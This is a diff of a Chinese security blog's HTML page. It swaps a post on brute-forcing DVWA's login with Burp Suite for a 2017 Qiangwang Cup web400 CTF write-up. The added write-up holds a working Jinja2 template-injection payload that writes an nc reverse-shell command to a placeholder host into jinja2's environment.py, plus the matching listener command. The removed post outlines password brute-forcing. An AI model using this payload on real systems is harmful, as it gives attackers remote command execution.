@@ -64,7 +64,7 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="渗透测试,网络安全," />
+  <meta name="keywords" content="CTF,writeup," />
 
 
 
@@ -82,23 +82,22 @@
 
 
 
-<meta name="description" content="本文通过DVWA的Brute Force模块进行暴力破解漏洞的一般演示，其中还使用了burpsuite工具。">
+<meta name="description" content="2017强网杯web题web400的Writeup，详细分析利用过程。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="6.渗透测试平台DVWA之暴力破解">
-<meta property="og:url" content="http://yoursite.com/渗透测试平台DVWA之暴力破解/index.html">
+<meta property="og:title" content="18.2017强网杯web400题Writeup">
+<meta property="og:url" content="http://yoursite.com/2017强网杯web400题Writeup/index.html">
 <meta property="og:site_name" content="Angoddess Blog">
-<meta property="og:description" content="本文通过DVWA的Brute Force模块进行暴力破解漏洞的一般演示，其中还使用了burpsuite工具。">
-<meta property="og:image" content="http://yoursite.com/uploads/6/6-1.png">
-<meta property="og:image" content="http://yoursite.com/uploads/6/6-2.png">
-<meta property="og:image" content="http://yoursite.com/uploads/6/6-3.png">
-<meta property="og:image" content="http://yoursite.com/uploads/6/6-4.png">
-<meta property="og:image" content="http://yoursite.com/uploads/6/6-5.png">
-<meta property="og:image" content="http://yoursite.com/uploads/6/6-6.png">
-<meta property="og:updated_time" content="2016-04-20T10:02:28.189Z">
+<meta property="og:description" content="2017强网杯web题web400的Writeup，详细分析利用过程。">
+<meta property="og:image" content="http://yoursite.com/uploads/18/18-1.png">
+<meta property="og:image" content="http://yoursite.com/uploads/18/18-2.png">
+<meta property="og:image" content="http://yoursite.com/uploads/18/18-3.png">
+<meta property="og:image" content="http://yoursite.com/uploads/18/18-4.png">
+<meta property="og:image" content="http://yoursite.com/uploads/18/18-5.png">
+<meta property="og:updated_time" content="2017-09-11T08:08:32.797Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="6.渗透测试平台DVWA之暴力破解">
-<meta name="twitter:description" content="本文通过DVWA的Brute Force模块进行暴力破解漏洞的一般演示，其中还使用了burpsuite工具。">
-<meta name="twitter:image" content="http://yoursite.com/uploads/6/6-1.png">
+<meta name="twitter:title" content="18.2017强网杯web400题Writeup">
+<meta name="twitter:description" content="2017强网杯web题web400的Writeup，详细分析利用过程。">
+<meta name="twitter:image" content="http://yoursite.com/uploads/18/18-1.png">
 
 
 
@@ -116,7 +115,7 @@
   };
 </script>
 
-  <title> 6.渗透测试平台DVWA之暴力破解 | Angoddess Blog </title>
+  <title> 18.2017强网杯web400题Writeup | Angoddess Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -256,7 +255,7 @@
             
             
               
-                6.渗透测试平台DVWA之暴力破解
+                18.2017强网杯web400题Writeup
               
             
           </h1>
@@ -268,8 +267,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-04-20T17:55:43+08:00" content="2016-04-20">
-              2016-04-20
+            <time itemprop="dateCreated" datetime="2017-09-11T15:48:35+08:00" content="2017-09-11">
+              2017-09-11
             </time>
           </span>
 
@@ -298,8 +297,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/渗透测试平台DVWA之暴力破解/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="渗透测试平台DVWA之暴力破解/" itemprop="commentsCount"></span>
+                <a href="/2017强网杯web400题Writeup/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017强网杯web400题Writeup/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -309,7 +308,7 @@
 
           
           
-             <span id="/渗透测试平台DVWA之暴力破解/" class="leancloud_visitors" data-flag-title="6.渗透测试平台DVWA之暴力破解">
+             <span id="/2017强网杯web400题Writeup/" class="leancloud_visitors" data-flag-title="18.2017强网杯web400题Writeup">
                &nbsp; | &nbsp;
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -331,7 +330,29 @@
       
 
       
-        <p>　　本文通过DVWA的Brute Force模块进行暴力破解漏洞的一般演示，其中还使用了burpsuite工具。<a id="more"></a><br>　　选择Brute Force进行暴力破解测试<br><img src="/uploads/6/6-1.png" alt="Angoddess"><br>　　首先开启burpsuite，把浏览器代理到burpsuite进行截包。<br><img src="/uploads/6/6-2.png" alt="Angoddess"><br>　　随便输入一个用户名密码，然后查看burpsuite中数据包截取情况，可以看到已经截取到登录的请求包，账户密码是明文传输且使用get方法，我们需要把数据包发送到intruder模块进行爆破。<br><img src="/uploads/6/6-3.png" alt="Angoddess"><br>　　进入intruder模块，把用户名改为admin，密码作为破解对象进行暴力破解<br> <img src="/uploads/6/6-4.png" alt="Angoddess"><br>　　为了方便测试，这里直接手动输入几个密码作为字典，包含正确密码。<br> <img src="/uploads/6/6-5.png" alt="Angoddess"><br>　　然后开始破解，很快我们就可以看到破解出密码为password（根据反馈数据包长度以及内容进行判断）<br> <img src="/uploads/6/6-6.png" alt="Angoddess"><br>　　当然，我们也可以把用户名也作为破解对象，那么此时，破解的难度就会加大，耗时也会成倍增长，同时破解对象越多，耗时越长，难度越大。<br>　　暴力破解虽然没什么技术含量，且大多数时候比较耗时，然而，越是如此，越容易被忽略，在渗透测试当中常也能有意外收获。站点后台暴力破解的难度一般较大，且斩获较少，而对于用户系统来说，大量的用户总有那么些懒惰的人存在，喜欢简单易记的用户名密码，而这些都是暴力破解的突破口，当然，实际操作中还要结合其他资源。<br>　　暴力破解其实最主要的就是字典，一个好的字典，能让你节省大量时间，快速破解用户名密码。而一本好的字典不是随便网上搜出来的，而是经验的积累。最好就是有一本不是太大的常见用户名和密码字典，可以进行初步的测试，然后结合搜集到的站点的各种信息，制作一本针对性更强的字典来使用，这样既可以节省时间，又可以更加准确的破解账户密码。</p>
+        <p>　　2017强网杯web题web400的Writeup，详细分析利用过程。<br><a id="more"></a></p>
+<h2 id="Jinja模板注入漏洞验证"><a href="#Jinja模板注入漏洞验证" class="headerlink" title="Jinja模板注入漏洞验证"></a>Jinja模板注入漏洞验证</h2><p>　　注册一个账号2，然后利用donate功能，填入一个正常可访问的url地址，用户名是我们刚注册的用户名</p>
+<p><img src="/uploads/18/18-1.png" alt="Angoddess"></p>
+<p>　　触发报错，如图：</p>
+<p><img src="/uploads/18/18-2.png" alt="Angoddess"></p>
+<p>　　变量text的值就是我们构造的用户名，在jinja模板中执行的结果，执行代码看下图：</p>
+<p><img src="/uploads/18/18-3.png" alt="Angoddess"> </p>
+<p>　　以上证实存在模板注入，<code>\{\{\}\}</code>里面的内容会被执行</p>
+<h2 id="利用模板注入获取反弹shell"><a href="#利用模板注入获取反弹shell" class="headerlink" title="利用模板注入获取反弹shell"></a>利用模板注入获取反弹shell</h2><p>　　首先我们利用jinja模板语言，调用python的内置方法，来获取当前的所有可引用的方法列表</p>
+<p>　　注册一个用户名为<code>\{\{&#39;&#39;.__class__.__mro__[2].__subclasses__()\}\}</code>的账号<br>　　<br>　　同样触发漏洞，我们可以看到当前可调用的一些引用方法</p>
+<p><img src="/uploads/18/18-4.png" alt="Angoddess"></p>
+<p>　　我们利用file方法来进行操作，file的索引是40（按顺序算），我们构造我们的payload，利用它来进行反弹shell，从而达到命令执行</p>
+<p>　　<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">　　Payload:</span><br><span class="line">&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;2f7573722f6c6f63616c2f6c69622f707974686f6e322e372f646973742d7061636b616765732f6a696e6a61322f656e7669726f6e6d656e742e7079&apos;.decode(&apos;hex&apos;),&apos;a&apos;).write(&quot;\nos.system(&apos;nc xx.xx.xx.xx 5|sh|nc xx.xx.xx.xx 6&apos;)&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>　　加密的hex密文内容是</p>
+<p>　　<code>/usr/local/lib/python2.7/dist-packages/jinja2/environment.py</code></p>
+<p>　　这是jinja的模板环境文件，该文件中引用了os模块，所以我们通过写入调用系统命令来执行nc反弹shell，酱紫只要web应用每次使用jinja模板都会触发该shell命令。</p>
+<p>　　那么现在我们先注册用户名为payload内容的用户，xx.xx.xx.xx替换为接收反弹shell的服务器地址</p>
+<p>　　然后在我们接收shell的服务器上启动监听</p>
+<p>　　<code>nc -vv -l -p 5|nc -vv -l -p 6</code></p>
+<p>　　最后利用donate功能，这回触不触发报错都没关系了，只要是正确可访问的网址就行</p>
+<p><img src="/uploads/18/18-5.png" alt="Angoddess"></p>
+<p>　　直接当前目录看到flag文件，成功获取flag</p>
+<p>　　PS：我上面使用的nc的一种方式来反弹shell，由于用户名长度有限制，所以太常的payload是注册不了用户名的，那么就还有一种方法，就是远程获取反弹shell的文件，读取内容写入该文件，或者下载下来，额外执行，这里就多说了！</p>
 
       
     </div>
@@ -352,9 +373,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/渗透测试/" rel="tag">#渗透测试</a>
+            <a href="/tags/CTF/" rel="tag">#CTF</a>
           
-            <a href="/tags/网络安全/" rel="tag">#网络安全</a>
+            <a href="/tags/writeup/" rel="tag">#writeup</a>
           
         </div>
       
@@ -363,17 +384,13 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/渗透测试平台DVWA之简单介绍/" rel="next" title="5.渗透测试平台DVWA之简单介绍">
-                <i class="fa fa-chevron-left"></i> 5.渗透测试平台DVWA之简单介绍
+              <a href="/2017年5月13日国内高校比特币勒索事件与防范应对措施/" rel="next" title="17.2017年5月12日国内高校比特币勒索事件与防范应对措施">
+                <i class="fa fa-chevron-left"></i> 17.2017年5月12日国内高校比特币勒索事件与防范应对措施
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/渗透测试平台DVWA之命令执行/" rel="prev" title="7.渗透测试平台DVWA之命令执行">
-                7.渗透测试平台DVWA之命令执行 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -399,8 +416,8 @@
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="渗透测试平台DVWA之暴力破解/"
-           data-title="6.渗透测试平台DVWA之暴力破解" data-url="http://yoursite.com/渗透测试平台DVWA之暴力破解/">
+      <div class="ds-thread" data-thread-key="2017强网杯web400题Writeup/"
+           data-title="18.2017强网杯web400题Writeup" data-url="http://yoursite.com/2017强网杯web400题Writeup/">
       </div>
     
   </div>
@@ -509,7 +526,7 @@
               
             
             
-              <p class="post-toc-empty">此文章未包含目录</p>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Jinja模板注入漏洞验证"><span class="nav-number">1.</span> <span class="nav-text">Jinja模板注入漏洞验证</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用模板注入获取反弹shell"><span class="nav-number">2.</span> <span class="nav-text">利用模板注入获取反弹shell</span></a></li></ol></div>
             
           </div>
         </section>
